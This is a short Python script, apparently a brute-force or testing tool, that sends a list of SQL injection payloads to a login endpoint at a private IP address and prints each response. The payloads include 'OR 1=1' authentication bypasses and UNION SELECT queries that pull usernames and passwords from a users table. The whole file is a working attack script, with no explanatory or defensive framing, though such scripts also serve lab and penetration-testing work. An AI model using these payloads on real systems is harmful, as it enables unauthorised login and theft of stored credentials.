# brue.py

import requests

# Define the URL of the login API
url = 'http://10.7.35.138:8791/login'

# List of payloads to test
payloads = [
    {"username": "admin' OR '1'='1", "password": "password"},
    {"username": "admin' OR '1'='1' --", "password": "password"},
    {"username": "' OR 1=1 --", "password": "password"},
    {"username": "' UNION SELECT null, username, password FROM users --", "password": "password"},
    {"username": "' AND 1=2 UNION SELECT null, username, password FROM users --", "password": "password"}
]

# Function to test the payloads
def test_payloads(payloads):
    for payload in payloads:
        response = requests.post(url, data=payload)
        print(f"Testing payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text}\n")

# Run the script
if __name__ == "__main__":
    test_payloads(payloads)
